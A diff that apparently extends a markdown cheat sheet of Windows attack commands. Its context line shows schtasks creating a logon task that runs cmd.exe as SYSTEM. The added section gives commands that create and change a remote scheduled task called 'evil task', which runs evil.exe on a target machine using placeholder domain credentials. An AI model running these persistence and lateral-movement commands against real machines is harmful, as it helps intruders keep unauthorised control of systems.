@@ -35,3 +35,13 @@ Input:
 Input:
 
     schtasks /create /tn "mysc" /tr C:\windows\system32\cmd.exe /sc ONLOGON /ru "System"
+    
+### Remote Scheduled Task
+#### Create, modify, remove scheduled task (replace IP with target)
+Input:
+    
+    SCHTASKS /Create /S 127.0.0.1 /RU <DOMAIN>\<USER> /RP <Password> /TN "evil task" /TR "c:\Windows\System32\evil.exe" /SC daily /ST 17:00
+
+Input:
+    
+    SCHTASKS /Change /S 127.0.0.1 /RU <DOMAIN>\<USER> /RP <Password> /TN "evil task" /ST 17:01
